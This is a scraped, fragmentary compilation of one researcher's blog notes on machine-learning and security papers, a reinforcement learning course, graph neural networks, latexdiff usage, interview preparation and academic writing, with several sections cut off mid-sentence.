    "content": "1. Attention is All You NeedPaper/TF_code/Torch_codeMain IdeaThe paper is the first to propose a parallel Transformer in the sequence transduction models.Key insightThe problems of the RNN (LSTM, GRU) model: Need to calculate $h_t$ by $h_{t-1}$ which cannot be executed in parallel. While Transformer reduces the sequential computationModel Structure:  Position Encoding: they use sine and cosine functions to convert the position to a vector. They think it can extrapolate to sequence lengths longer.  Attention: There are several key techniques in the attention mechanism like          Scaled Dot-product Attention: $Attention(Q,K,V)=softmax(\\frac{QK^T}{\\sqrt{d_k}})V$. $d_k$ means the dimension of keys.      Multi-Head Attention: It allows the model to jointly attend to information from different representation subspaces at different positions.        Position-wise Feed-Forward Networks: Fully connected layers.Difference of Attention and Self-AttentionUseful link to understand Attention.In general, attention is a vector of importance weights to predict or infer one element (a pixel in images or a word in sentences) based on other elements and their values. Attention is designed for translation and to help memorize long source sentences.While self-attention (intra-attention) is a mechanism relating different positions of a single sequence to compute the embeddings of the sequence.2. BERT: Pre-training of Deep Bidirectional Transformers for Language UnderstandingPaper/CodeMain IdeaThe paper designs BERT: Bidirectional Encoder Representations from Transformers. It uses the deep bidirectional representations from unlabeled text by conditioning on both left and right context in all layers.Key insight  Pre-training BERT: Masked LM.  Next Sentence Prediction (NSP).3. Improving Language Understanding by Generative Pre-TrainingPaper/CodeMain IdeaThe paper provide the first GPT model for a decoder-style LLM for generative modeling. They combine a unsupervised pre-training model and semi-supervised fine-tuning4. Reinforcement Learning from Human FeedbackThe concept is first promoted by Open AI in the paper in 2017. The main idea is to incorporate human feedback to solve deep RL tasks at scale to train better document summarization model: InstructGPT/ChatGPT.The reasons we need RLHF are:  A good loss function is unavailable for some purposes in NLP tasks: Speak in a humorous tone.          RLHF compares results instead of scoring them to avoid a loss function for these tasks.        Not enough labeled data for training.          RLHF uses a reward model to give guidance when training.      There are three steps of RLHF:  Step 1: Pretrain a language model.          For Open AI, they use a 175B model InstructGPT as a base model.      For DeepMind, they use 280B model Gopher.        Step 2: Gather data and train a reward model.          It is hard to give scores to the outputs but it works better when comparing two outputs. So the reward model will rank the outputs of the Pretrained LM model by comparing each of two outputs.        Fine-tune the LM model with reinforcement Learning.          Mapping ideas to RL model                  Policy: a sequence of text generated by the LM model.          Action Space: all the possible tokens in the vocabulary.          Observation Space: the distribution of input token sequences.          Reward: the reward model’s rankings and the constraint on policy shift.                    A GPT Training Workflow from Andrej:Why is RLHF better?There is not a clear answer for that. Based on my understanding, RLHF is a good way to avoid overfitting since the previous training process is supervised. Besides, the RL model is more general and is able to deal with various inputs which is also necessary for a LM model.Reference:  https://wandb.ai/ayush-thakur/RLHF/reports/Understanding-Reinforcement-Learning-from-Human-Feedback-RLHF-Part-1–VmlldzoyODk5MTIx  https://huggingface.co/blog/rlhf  https://www.youtube.com/watch?v=bZQun8Y4L2A&amp;ab_channel=MicrosoftDeveloper  https://lilianweng.github.io/posts/2018-06-24-attention/"

First, we formally define the attacker’s objective under performance degradation and object hiding. Then, we develop new attack by whether to bound the norm. We evaluate different attack options on three datasets and three PCSS models. We found all the models are vulnerable and attacking point color is more effective. With this study, we call the attention of the research community to develop new approaches to harden PCSS models.This is an example that the PCSS model in delivery reobots are misled due to the perturbation in the environment.The workflow of the attack is shown in the following image.Key insight  We develop a holistic framework to enable various attack configurations against PCSS models and extend the previous attacks that are coordinate-based to color-based  We evaluate different attack configurations against three types of PCSS models and indoor and outdoor datasets.Evaluation  Models: PointNet++, ResGCN-28, RandLA-Net  Datasets: S3DIS, Sementic3DThe comparison between color and coordinate attack:Color-based attack on different models:"

    "content": "I use the blog to record my learning procedures of reinforcement learning course from Hugging FaceUnit 1: Introduction to Deep Reinforcement LearningConcepts:  Reinforcement Learning is a computational approach of learning from action. An agent is designed based on the environment interactions with trail and error and receving rewards(+/-) as feedback.  The objective function is to maximize the expected cumulative reward.  The RL process is a sequence of state, action, reward, and next state.  The rewards can be discounted: the early rewards are more probable and predictable then long term future rewards.  The optimal policy is necessary to solve an RL problem which decide the action to take given a state. One example is to maximize the expected return.          Policy-based methods: Training the plicy directly.      Value-based methods: Training the policy by a value function.

There are two ways to get it:  Policy-based: training the policy directly.  Value-based: Find an optimal value function.          Most of the time, an Epsilon-Greedy Policy is used to handle the exploration/exploitation trade-off.                  The state-value function.          The action-value function.                    The return valud is the expected return.One way to simplify the value estimation is Bellman Equation. It is similar to Bellman-Ford algorithm to me. The main idea is to calculate the value as the sum of immediate reward plus the discounted value of the state that follows.      Two learning strategies:  Monte Carlo: randomly generate a sequence of state, action, reward… and calculate the the return at the end of the episode and use it as a target for updating.  Temporal Difference Learning: update the value function from a step.Q-LearningAn off-policy value-based method that uses a Temporal Difference approach to train its action-value function.The epsilon-greedy policy: Instead local optimal action, use epsilon as the possibility to take random action or greedy action.Unit 3: Deep Q-Learning with Atari Games 👾 using RL Baselines3 ZooUse Neural Network to take a state and approximate Q-values.The Deep Q-Network: DQNInput: several frames of gamesOutput: a vector of Q-values for each possible action at that state.The Deep Q AlgorithmIt uses a deep neural network to approximate the different Q-values for each possible action at a state (value-function estimation).It has two phases:  Sampling: Store the observed experience tuples in a replay memory.  Training: Select a small batch of tuples randomly and learn from this batch using a gradient descent update step.One main problem of Deep Q-Learning is instability. There are three solutions:  Experience Replay to make more efficient use of experiences.          Make more efficient use of the experiences during the training.      Avoid forgetting previous experiences and reduce the correlation between experiences.        Fixed Q-Target to stabilize the training.          Use a separate network with fixed parameters for estimating the TD Target.      Copy the parameters from our Deep Q-Network every C steps to update the target network.        Double Deep Q-Learning, to handle the problem of the overestimation of Q-values.          Use the DQN Network to select the best action to take for the next state.      Use the Target network to calculate the target Q-value of taking that action at the next state.      Bonus Unit 2: Automatic Hyperparameter Tuning with OptunaOptuna is a library to search for the best hyperparameters automatically.Unit 4: Policy Gradient with PytorchThe policy-based method:  The idea is to parameterize the policy and maximize the performance of the parameterized policy using gradient ascent.  The policy-gradient method is a subclass of the policy-based method.The advantages and disadvantages of policy-gradient methodsAdv:  The simplicity of integration.  Policy-gradient methods can learn a stochastic policy.  Policy-gradient methods are more effective in high-dimensional action spaces and continuous actions spaces.  Policy-gradient methods ahve better convergence properties.Dis:  It converges to a local maximum instead of a global optimum.  It goes slow: inefficient.  It has high variance.Unit 5: Introduction to Unity ML-AgentsUnity ML-Agent is a toolkit for the game engine Unity to create environments to train the agents.Unit 6: Actor Critic Methods with Robotics EnvironmentsPolicy-gradient methods estimate the weights of the optimal policy using Gradient Ascent which means it chooses the steepest increase in return.Actor-Critic methodsA hybrid architecture combing Value-based and Policy-based methods to stabilize the training by reducing the variance.  An actor to control how the agent behaves.  A critic to measure how good the action is.So there are two function approximations:  A policy that control how our agent acts: $\\pi_\\theta(s)$.  A value function to assist the policy update by measuring how good the action taken is: $q_w(s,a)$Unit 7: Introduction to Multi-Agents And AI vs AIDecentralized approach:  Treat all agents independently without considering the existence of the other agents.  All agents consider others agents as part of the environment.  No guarantee of convergence.Centralized approach:  A single policy is learned from all the agents.  Takes as input the present state of an environment and the policy outputs joint actions.  The reward is global.Unit 8: Proximal Policy Optimization /with DoomProximal Policy Optimization (PPO): An architecture that improves the agent’s training stability by avoiding large policy updates.Two reasons that we avoid large policy update:  Small update is more likely to converge to an optimal solution.  Big step can result in off the cliff and take a long time to recover.Clipped Surrogate Objective Function\\(L^{CLIP}(\\theta)=E_t[min(r_t(\\theta)A_t, clip(r_t(\\theta), 1-\\epsilon, 1+\\epsilon)A)_t)]\\)where $r_t(\\theta)$ denotes the probability ratio between old and current policy.Bonus Unit 3: Advanced Topics In Reinforcement Learning      Model-based Reinforcement Learning: learning a model of said environment, and then leveraging the model for control (making decisions).        Offline vs Online Reinforcement Learning    Reinforcement Learning from Human Feedback (RLHF): It a methodology for integrating human data labels into a RL-based optimization process. It is motivated by the challenge of modeling human preferences.     - Useful link: https://huggingface.co/blog/rlhf  Decision Transformers: instead of training a policy using RL methods, such as fitting a value function, that will tell us what action to take to maximize the return (cumulative reward), we use a sequence modeling algorithm (Transformer) that, given a desired return, past states, and actions, will generate future actions to achieve this desired return.

ADBench: Anomaly Detection BenchmarkPaper/CodeMain IdeaThe paper builds a comprehensive benchmark for tabular anomaly detection which covers three levels of supervision (Unsup, sup, Semi-sup) and considers 57 datasets and 30 algorithms.Key Insight  No benchmarked unsupervised algorithm is better than others: Specific algorithms should be selected for specific datasets.  1% labeled anomalies leads to a better performance for semi-supervised methods compared to the best unsupervised method.  By preprocessing the data with carefully controlling,  the best unsupervised methods https://www.ndss-symposium.org/ndss-paper/doitrust-dissecting-on-chain-compromised-internet-domains-via-graph-learning/for specific types of anomalies are better than semi- and fully-supervised methods: understanding the data characteristics is important.  Semi-supervised methods show potential to be robust on noisy and corrupted data.4. DoItrust: Dissecting On-chain Compromised Internet Domains via Graph LearningPaper/Main IdeaThe paper combines MLP for node features, GNN for topology information together to make suspicion prediction by global propagation and then designs pruning strategies to remove suspicious nodes.Key Insight  Define an expansion graph which creates organically grown Internet domain all-lists based on trust transitivity.  Design a semi-supervised suspicion prediction scheme to predict the relation of a node with the targets of compromise.          Design a new ranking algorithm based on PageRank to combine both global information and the local topology.        After that, use pruning strategies to remove highly suspicious nodes. There are two strategies.          Shortest path-based pruning      Flow-based pruning      5. Stochastic Optimization of Areas Under Precision-Recall Curves with Provable ConvergencePaper/CodeMain IdeaThe paper designes a specific loss funcation and optimizer on Average Precision (AP) / Areas under precision-recall curves (AUPRC). The optimization method has convergence guarantee.Key Insight  Formalize the loss function by approximation.  Design the stochastic optimization of AP by approximation.ProvementStep 1: (First approximation: AUPRC-&gt; AP)The AUPRC is an average of the precision weighted by the probability of a given threshold. In that case, for a finite set of test dataset $D={(x_i, y_i), i=1,\\dots ,n}$ and the prediction score $h_w(x_i)$ of $x_i$, the AP (average prevision) can approximate AUPRC as the following equation:\\[AP = \\frac{1}{n_+}\\sum_{i=1}^n I(y_i=1)\\frac{\\sum_{s=1}^nI(y_s=1)I(h_w(x_s)\\geq h_w(x_i))}{\\sum_{s=1}^nI(h_w(x_s)\\geq h_w(x_i))}\\]$I(\\cdot)$ is 1 if the input discriminant is true and 0 if it is false.Step 2:(Second approximation: loss function)The non-continuous indicator function $I(h_w(x_s)\\geq h_w(x_i))$ is non-tractable, so a surrogate loss function is necessary to facilitate the optimization algorithm. In the paper, squared hinge loss is used:\\(l(w;x_s;x_i)= (max\\{m-(h_w(x_i)-h_w(x_s)), 0\\})^2\\)where $m$ is a margin paramter. In that case, the optimization problem becomes:\\(\\min_wP(w)= \\frac{1}{n_+}\\sum_{x_i\\in D_+}\\frac{-\\sum_{s=1}^nI(y_s=1)l(w;x_s;x_i)}{\\sum_{s=1}^nl(w;x_s;x_i)}\\)Step 3: (Formalize the objective function)Define:\\(g(w;x_j,x_i)=[g_1(w;x_j,x_i),g_2(w;x_j,x_i)]^T=[I(y_s=1)l(w;x_s;x_i), l(w;x_s;x_i)]^T\\)\\(g_{x_i}(w)=E_{x_j\\sim D}[g(w;x_j,x_i)]\\)where $g_{x_i}(w): R^d\\rightarrow R^2$ and $f(s)=-\\frac{s_1}{s_2}:R^2\\rightarrow R$. And then rewrite the $P(w)$ by $g(w;x_j,x_i)$ and $f(s)$.\\(P(w)=\\frac{1}{n_+}\\sum_{x_i\\in D_+}f(g_{x_i}(w))=E_{x_i\\sim D_+}[f(g_{x_i}(w)]\\)This function is  an instance of two-level stochastic dependent compositional functions.Step 4: (Calculate the gradient)Let the gradient of $g_{x_i}(w)$ be denoted by $\\nabla_wg_{x_i}(w)^T=(\\nabla_w[g_{x_i}(w)]1, \\nabla_w[g{x_i}(w)]_2)$.\\(\\begin{align*}\\nabla_w P(w)=\\frac{1}{n_+}\\sum_{x_i\\in D_+}\\nabla_wg_{x_i}(w)^T\\nabla f(g_{x_i}(w)) = \\\\\\frac{1}{n_+}\\sum_{x_i\\in D_+} \\nabla_wg_{x_i}(w)^T(\\frac{-1}{[g_{x_i}(w)]_2},\\frac{[g_{x_i}(w)]_1}{([g_{x_i}(w)]_2)^2})^2\\end{align*}\\)And then use stochastic samplesw to approximate the quantities.6. How to Cover up Anomalous Accesses to Electronic Health RecordsPaperMain IdeaThe paper analyzes the electronic health record (EHR) system by two adversarial attacks (evasion attack and poisoning attack). It shows that the evasion attack is effective while the poisoning attack fails.Key Insight  The main difference with the previous works is the way to define the successful attack: all the injected covering accesses are stealthy to the model.  It tries white-box, gray-box on evasion attack.7. SecureFL: Privacy Preserving Federated Learning with SGX and TrustZonePaper/8.

Use latexdiff on MacMac OS already has perl so only the latexdiff needs to be installed.The eastiest way to install latexdiff is by homebrew:brew install latexdiffbrew upgrade latexdiffbrew uninstall latexdiffAnd use the commend to generate diff.tex:latexdiff old.tex new.tex --flatten &gt; diff.texUseful link:  https://shannonmlocke.wordpress.com/2020/05/10/a-short-guide-to-using-latexdiff/3. How to check memory leakage in pytorchUseful link.Common causes:  If I create an array that holds tensors and continually add tensors to the array, it will fill up the memory.  If I compute something from tensors but do not get backpropogation, these tensors will not be cleared and keep growing.          The issue can be solved by adding .detach() to any tensor that does not need to be involved in training.      Conclusions:  torch.cuda.empty_cache() is just a bandaid which delay the out of the memory issue instead of solving it.  Use torch.cuda.memory_allocated() and torch.cuda.max_memory_allocated() to print the percentage of used memory at the top of the training loop.4. How to use latexdiff on MacUse the following commands to install latexdiff and texlive.brew install latexdiffbrew install texliveRun the simple bash script. Or try this one if necessary: repo. Be careful about the table comparison since there is a bug in latexdiff. Recommand to use a separate file to avoid table comparison.# latexdiff.sh#!/bin/bashlatex_file_modify=(\"main.tex\" \"appendix.tex\")latex_file_origin=(\"main.tex\" \"appendix.tex\")latex_file_num=2origin_dir=\"$1\"modify_dir=\"$2\"diff_dir=\"$3\"for((i=0;i&lt;${latex_file_num};i++));docp \"${origin_dir}/${latex_file_origin[${i}]}\" \"${diff_dir}/origin_${latex_file_origin[${i}]}\"cp \"${modify_dir}/${latex_file_modify[${i}]}\" \"${diff_dir}/modify_${latex_file_modify[${i}]}\"rm \"${diff_dir}/${latex_file_modify[${i}]}\"cd \"${diff_dir}\"latexdiff -t UNDERLINE \"origin_${latex_file_origin[${i}]}\" \"modify_${latex_file_modify[${i}]}\" &gt; \"${latex_file_modify[${i}]}\"rm \"origin_${latex_file_origin[${i}]}\"rm \"modify_${latex_file_modify[${i}]}\"cd ..doneFinally, use the ./latexdiff.sh &lt;origin_dir&gt; &lt;modify_dir&gt; &lt;diff_dir&gt; to generate the diff tex files and upload to overleaf to see the results.  Notice that the tex files should be under the root folder instead of multi-level folders."

How many meetings do you have every week?  What is the ratio of testers to developers to program managers? What is the interaction like? How does project planning happen on the team?Insightful:  I noticed that you use technology X. How do you handle problem Y?  Why did the product choose to use the X protocol over the Y protocol? I know it has benefits like A, B, C, but many companies choose not to use it because of issue D.Passion:  I am very interested in scalability. Did you come in with a background  in this, or what opportunities are there to learn about it?  I am not familiar with technology X, but it sounds like a very interesting solution. Can you tell me a bit more about how it works?3. Technical QuestionHow to practice a Question?  Try to solve the problem on your own.  Write the code for the algorithm on paper.  Test your code on paper: general cases, base cases, error cases, and so on.  Type your paper code as-is into  a computer: start a list of all the errors you make to keep these in mind in the real interview.3.1 Must-have Knowledge            Data structure      Algorithms      Concepts                  Linked Lists      breadth First Search      Bit Manipulation              Binary Trees      Depth First Search      Singleton Design Pattern              Tries      Binary Search      Factory Design Pattern              Stacks      Merge Sort      Memory (Stack vs Heap)              Queues      Quick Sort      Recursion              Vectors/ArrayLists      Tree Insert/Find/e.t.c.

Design an Algorithm          what is the space and time complexity?      What if there is a lot of data?      Does it cause other issues?      If there are other issues or limitations, did you make the right trade-offs?      If they gave specific data, have you leveraged that information? Usually there is a rason to give specific information.        Pseudocode  Code          Use data structures generously      Don’t crowd your coding: start fromt he upper left hand corner of a whiteboard.

    "content": "In this blog, I would like to talk about my summary about how to write a good paper or rebuttal in academia.Paper Writing  Determining the big picture:          Build the scaffolding before filling in the details. Write sections and topic setences first.                  Start at a high level by outlining sections.                    Assess balance and budget pages accordingly.      Follow the convention from other research papers like the paper structure.      Signpost your paper.                  Examples of signposts include: an outline of the paper at the end of the introduction (“The rest of this paper proceeds as follows.”), a preamble to each section (“In this section, we discuss…”), declarative subsection titles, and (within reason) bold paragraph headings (such as those in this blog post).                      Use figures and plots to support your text:          Keep figures as clean and simple as possible.                  Lines should not cross one another.          Fonts should be roughly the same size as the font size in the paper itself.          The use of ink should be minimized (no unnecessary shading, backgrounds or colors)                    Each plot should have exactly one technical point.                  Using different colors to show different methods when comparing them.                      Make a good impression:          Spend a lot of time on your introduction: start early.                  The introduction summarizes the story of your paper.                    Write the introduction first and last.                  Early to think about the following questions in the first round of introduction:                          What is the problem?              Why is it hard?              Why will the solution be interesting to readers if it is achieved?                                Check each claim in the introduction is supported by the results and data in the second round.                    Perform some “landscaping” on your paper.                  Place (and create) signposts, figures, and graphs to create whitespace and avoid “walls of text”.          Check your spelling.          Make the last page look decent.          Eliminate widows and dangling text.                          widows on paragraphs: paragraphs that end with a single word on the last line.                                            Be efficient:          Tailor the length of your paper to the information content.                  Remember the goal is to efficiently transfer information.                    Keep words simple and sentences short.                  Omit needless words.                    Eliminate redundancy.      Be as specific and precise as you can.      Use clear and consistent terminology.      Some questions that the reviewers care:  What is the main novelty?  How is the method proposed in the paper compared to existing works?  Compared with esisting works, what aspect does the paper improve on?  How does your method fundamentally differ from other methods?  What specific components of the method cause the improvement?Tips:  Write the related work section as an story.RebuttalSome useful sequences:Opening  Thank you for your suggestion.

They observe that with the increase of the degree of anomaly nodes, the spectral energy concentrate less on low-frequency eigenvalues.      They redefine the high-drequency area to avoid the high cost of eigen-decomposition:                  \\[S_{high}=\\int_0^{\\lambda_N} 1-f(t)dt\\]                                Hammond’s Graph Wavelet          It is composed of a mother wave and a group of wavelet bases: $W=(W_{\\psi_1}, W_{\\psi_2},\\cdots)$      $W_{\\psi_i}(x)=Ug_i(\\Lambda)^T x$ where $g_i(\\cdot)$ is a kernel function and $g_i(\\lambda)=diag(g_i(\\lambda))$.  -        Beta Wavelet on Graph  Beta Wavelet Graph Neural Network          $Z_i=W_{i, C-i}(MLP(X))$      $H=AGG([Z_0, Z_1, \\cdots, Z_C])$      ExperimentsDatasets:  YelpChi  AmazonComparisons:  MLP/SVM  GCN/ChebyNet/GAT/GraphSAGE…  GraphConsis/CAREGNN…A Comparative Study for Unsupervised Network Representation LearningarxivMain IdeaThe paper summarizes several unsupervised network representation learning (UNRL) approaches over graphs:  Random Walk based  Matrix Factorization  Deep Learning basedThey consider 9 UNRL methods and 11 datasets on two tasks: node classification and link prediction, and analyze all of them to show a clear blueprint of the topic.The involved algorithms are listed in the table:ExperimentsDatasets:Graph Structure of Neural Networksarxiv/code/ ICML2020Main IdeaThe paper takes the neural networks as graphs and develops a graph-based representation called relational graph. Then they design a graph generator WS-flex to systematically explore the design space of neural networks.In the Average Path Length-Clustering Coefficient figures, they claim to find sweet spots to find the best performance models. They furthermore provide a quick way to identify a sweet spot.SIGL: Securing Software Installations Through Deep Graph LearningarXivMain IdeaThe paper designs a tool, SIGL, to detect malicious behavior on software installation. It first build the provenace graphs by system call activities. Then it uses Graph LSTM as an autoencoder to generate embeddings.System Overview:  Data Collection and Featurization  Model Training and Validation  Anomaly Detection and Prioritization    Key insights    Formalize the problem of detecting malicious software installation.  Define the Software Installation Graphs and use an autoencoder to generate graph-level embeddings.Threat modelThey define the installation behavior of a software package as a chain of system events which can be displayed as a directed acyclic graph. Nodes represent processes and objects while edges represent interactions. The operating system and audit framework are benign.ExperimentsDataset: synthetic dataset on Windows ETW and Linux AduitIt also consider the poisoning attack and adversarial attack. For poisoning attacks, different ratios of malware data from 5% to 25% are added.For adversarial attacks, they design restrict black-box attack (RBA) including feature and structure attacks and practical black-box attack (PBA) including hierarchical reinforcement learning attack.You are what you do: Hunting Stealthy Malware via Data Provenance Analysispaper/slide/videoMain ideaThe paper designs a provenance-based approach ProvDetector to detect stealthy malware.  Provenance graph building  Representation Extraction          Rareness-based path selection        Embedding  Anomaly DetectionKey insights  Detection of marginal deviation: Impersonation-based stealthy malware blends into benign programs. ProvDetector needs to identify and isolate the marginal outlier events from the benign behaviors.  Scalable model building: The size of provenance graphs is super large. ProvDetector works on the suspicious subgraphs by ranking the top $K$ uncommon causal paths.Threat ModelThe paper concentrates on stealthy malware that leverages legitimate methods or machine services from the victim’s host to exploit and execute malicious activities.  The operating systems and the loggers are benign or in the trusted computing base (TCB) and the adversary cannot change the records.  The side channel attack is also not consideredExperimentsThey collected process instances from 23 programs. In conclusions, they tested on 1150 malware samples that hijack benign processes.They also evaluated the interpretation of detection results.  Simple models do not perform well because they can only consider one hop neighborhoods.  Whole Graph modeling is not a good feature based on their experiments when they use graph2vec to detect hijacked process attacks.Log2vec: A heterogeneous Graph Embedding Based Approach for Detecting Cyber Threats within Enterprisepaper/Main ideaThe paper design an embedding generator to detect malicious logs. It firstly build a heterogeneous graph from logs  that each node represents the log event and they design 10 rules to decide the edges. Basically, the edges show the common hosts or temporal sequence between nodes.In general, the heterogeneous graph looks like a self-defined connections instead of the raw node interaction structures.After the graph generating, they use random walk and word2vec to generate the node embedddings and clustering algorithm to detect anomaly nodes.Key insights  The graph definition is totally different from provenance graphs. It looks like a multi-dimensional log sequence.  It did not use GNN models. Instead, Random walk + word2vec is used.Experimentsdatasets:  cert  LANLLearning Causal Effects on Hypergraphspaper/codeMain IdeaThe paper concentrates on individual treatment effect (ITE) estimation on hypergraphs. One example of ITE estimation is how much an intervention (wearing face covering) will causally afect an outcome (COVID-19 infection) of each individual node. They use a hypergraph neural network to learn high-order interference.Key insights  The first one works on the problem of ITE estimation under high-order interference on hypergraphs.  Design a framework to models confounders and high-order interference by representation learning and hypergraph neural networks.ExperimentsDataset: Semi-synthetic data from Contact, Goodreads and Microsoft Teams.Multi-Dimensional Network Embedding with Hierarchical StructurepaperMain IdeaThe paper designs a multi-dimensional graph model that considers the edge types and node types in different layers/dimensions. For example, if a set of nodes can be shown as users/products and edges can be viewing or purchasing, we can draw two graphs that represent viewing and purchasing information. In that case, two graphs have same nodes but different edges.Model Structure  For different edge types, using a specific embedding to record the dimension information.  For different node types, using an embedding to record the hierarchical strucutre information.  Use a skip-gram model to learn the embeddings. And simply adding the embeddings together.GraphMAE: Self-Supervised Masked Graph Autoencoderspaper/codeMain IdeaThe paper focuses on Self-supervised Learning (SSL) by graph autoencoders (GAEs). It lists four common problems of the current models:  The structure information is over-emphasized.  Feature reconstruction without corruption is not robust.  The mean square error is sensitive and unstable.  The decoder architectures are of little expressiveness.They improve the following parts:  Masked feature reconstruction.  Scaled cosine error.  Re-mask decoding.Background of Self-supervised Learning[1]  Generative: Use an encoder to generate middle vector $z$ and use an decoder to rebuild the orginal input $x$.  Contrastive: After getting the middle vector $z$, compare the similarity.  Generative-Contrastive: Based on the generative model, use a large model like ResNet to compare them.Model Techniques  Use feature reconstruction as the objective.  Reconstruct the masked features and apply a uniform random sampling strategy.  Use a GNN-decoder with re-mask decoding.  Use scaled cosine error as the criterion.Reference:            Self-supervised Learning: Generative or Contrastive      "

Graph Summarization:          Process-based community Detection: Hierarchical Random Walk considering local neighbors and global process lineage trees.      Community Compression      Community Summarization: including a master process, time span, the top-ranked infoPath        Attack Investigation: find the events close to the POI (Point of Interest)Key insight (Why is the paper better than others?)The challenges:  The provenance graphs are heterogeneous while a general summarization takes the nodes equally.  The provenance graphs have plenty of trival and irrelevant dependencies.  No suitable graph summarization techniques.The insights:  It partitions graphs into process-centric communities (a group of processes and resources accessed by the processes) based on the observations:          The cooperated process nodes (intimate processes) either have strong correlation or data dependencies through resource nodes which means:                  They have parent-child relationships.          They share the same parent process and have data dependencies.          They summarize 8 different schemes for parent-child nodes, resources to list the way hierarchical random walk works.                      It compresses the edges by process and resource patterns.          Process-based patterns: the middle processes of the begin and end processes are parallel.      Resource-based patterns: the middle resources of the begin and end processes are parallel.        It prioritizes the InfoPaths to show the attack steps or major system activities at the top.ExperimentsDatasets:  Darpa TC 3Details:  Compare with Nodoze.

Key insightThe problems of the current methods:  Statistics-based detection: high false positive rate.  Specification-based detection: time-consuming and domain expertise needed.  Learning-based detection:          No explicable results or insights on the essential indicators or root causes of the attacks.      Extra manual efforts needed.

    "content": "In the blog, I exploit and summary the graph neural networks and related concepts based on some online blogs, papers and the book “Deep Learing on Graphs”.At first, the motivations of graph neural networks can be described as follows:  Feature Engineering: select a small subset of the graph features that have minimal redundancy but maximal relevance to the target.          Here is an example: given a graph $\\mathcal{G}={\\mathcal{V}, \\mathcal{E}}$ where $\\mathcal{V}$ means the vertices and $\\mathcal{E}$ shows the edges. It is assumed that each vertex has a set of features $\\mathcal{F}={f_1,f_2,\\dots f_d}$ and the goal is to select $K$ features from $\\mathcal{F}$ to denote the node where $K\\ll d$.        Representation Learning: automatically learn the features based on the downstream tasks.          Basically, the goal is to train a mapping function $f:X\\rightarrow Y$ that map the node features $\\mathcal{F}$ in $R^d$ to embeddings $\\mathcal{E}$ in $R^K$.      The tasks of graph cover many fields:  Supervised Learning: most of them are based on the whole graphs.          Graph Classification: Classify the label of a set of graphs.        Semi-supervised Learning:          Inductive Learning: do not know the whole graph when training.      Tranductive Learning: know the whole graph when training.                  Transductive Node classification: Classify the label of a set of nodes.                      Unsupervised Learning:Consequently, the graph neural network have the following advantages:  They can handle graphs better than CNNs or RNNs.  They can do propagation guided by the graph structure based on edges instead of taking edges as the features of nodes.  They can learn reasoning graphs from non-structural data.0. Foundations0.0 GraphsIn the section, the concepts of graphs are introduced and defined formally.A graph is defined based on the nodes and edges: $\\mathcal{G}={\\mathcal{V}, \\mathcal{E}}$ where $\\mathcal{V}$ means the set of vertices and $\\mathcal{E}$ shows the edges.In most of the cases, the whole graph connectivity is recorded by the Adjacency Matrix $\\mathcal{A} \\in {0,1}^{N\\times N}$ where $\\mathcal{A}{i,j} = 1$ if vertice $v_i$ and $v_j$ is connected. Otherwise $\\mathcal{A}{i,j} = 0$. For each node, the degree is defined as the number of the nodes it connects.\\(d(v_i)=\\sum_{v_j \\in \\mathcal{V}}\\mathcal{1}(v_i, v_j)\\)0.0.1 CentralityCentrality is an important feature to show the node importance in a graph. There are four different types:  Degree Centrality: the number of each node degree. (Treat all neigbhours equally)  Eigenvector Centrality: the corresponding elements in the eigenvector $c_e$ of the largest eigenvalue $\\lambda$ for the adjacency matrix $A$ show the nodes’ centrality scores because $\\lambda \\cdot c_e = A \\cdot c_e$ which originates from the definition of the eigenvector centrality $c_e(v_i)=\\frac{1}{\\lambda}\\sum_{j=1}^N A_{i.j}\\cdot c_e(v_j)$. (Treat neighbours with different weights)  Katz Centrality: add the constant to the definition of the eigenvector centrality. $c_k=\\alpha A c_k+\\beta$.Betweenness Centrality: Instead of checking the neighbours, betweenness centrality counts the paths through each node. It is calculating cost because all the nodes pair should be considered to get the final score.0.0.2 Spectral Graph Theory  Laplacian Matrix: $L=D-A$ where $D$ is a diagonal degree matrix and $A$ is the adjacency matrix. As to the eigenvalues and eigenvectors of the Laplacian Matrix there are two theorems:          $L$ is nonnegative.      The number of 0 eigenvalues equals the number of the connected components in the graph.      0.0.3 Complex Graphs  Heterogeneous graphs: different types of vertices and edges.  Bipartite graphs: the vertex set can be divided into two disjoint subsets which means each edge connects two vertices from two subsets.  Multidimensional graphs: different types of edges.  Signed graphs: positive and negative edges.  Hypergraphs: replace the edges to the areas to show the connections.  dynamic graphs: the graphs are changing based on the timestamps.0.0.4 TasksNode classificationLink PredictionGraph Classifiation0.1 Deep Learning0.1.0 Deep Feedforward NetworksFeedforward Networks are the basic deep learning model which are built by a multilayer neurons. Each layer can be represented by $f^{(i)}$ and the whole model can be represented as $F(x)=f^{(n)}(f^{(n-1)}(\\cdots f^{1}(x)))$. The model starts from the input layer and then feedforward the data into the hidden layers and finally return the results from the output layer.For each neuron in the hidden layers, its function is like\\(h = \\alpha(b+\\sum_{i=1}^n w_i\\cdot x_i)\\)where $\\alpha(\\cdot)$ is the activation function, $w_i$ is the weight and $b$ is the bias.Activation Functions  Recitifer: $ReLU(z)=max{0, z}$.  Logistic sigmoid: $\\sigma(z)=\\frac{1}{1+exp(-z)}$  tanh: $tanh(z)=\\frac{2}{1+exp(-2\\cdot z)}-1=2\\cdot\\sigma(2z)-1$0.1.1 Convolutional Neural NetworkA common situation for the convolution operation is that there is a noisy signal $f(t)$ and we want to average the value at time $t$ with its nearby values by a weight function $g(c)$.The basic convolution operation can be defined as \\((f\\ast g)(t)=\\int_{\\tau=t-n}^{t+n}f(\\tau)g(t-\\tau)d\\tau\\)In the practical machine learning scenario, the convolution operation can be extended to data with high dimensions. For a two dimensional image $I$, the convolution operation can be performed with a two-dimensional kernel $K$:\\(S(i,j) = (I\\ast K)(i,j)=\\sum_{\\tau=i-n}^{i+n}\\sum_{j=\\gamma-n}^{\\gamma+n}I(\\tau, \\gamma)K(i-\\tau,j-\\gamma)\\)So basically, the convolution operation in deep learning originate from the one in signal processing with the similar physical meaning.0.1.2 Recurrent Neural NetworkThe input of the RNN is a sequence and each neuron has two outputs: $y^{(i)}$ and $h^{(i)}$.\\(h^{(i)}=\\alpha(W_{hh}\\cdot h^{(i-1)}+W_{hx}x^{(i-1)}+b_{h})\\)\\(y^{(i)}=\\alpha(W_{yh}h^{(i)}+b_y)\\)where $W$s are the matrices to perform linear transformations, $b$s are the bias terms and $\\alpha$ is the activation function.  Long Short-Term Memory: each neuron contains two states: the cell state and the hidden state.  Gated Recurrent Unit: it combines the cell state and the hidden state are merged and the forget gate and the input gate are combined as the update gate.    0.1.3 Tips    Preventing Overfitting:    Weight Regularization  Dropout  Batch NOrmalizationChapter 1: Basic ConceptsThe goal of graph neural networks is to learn a state embedding which encodes the neighborhoods’ information. The state embedding 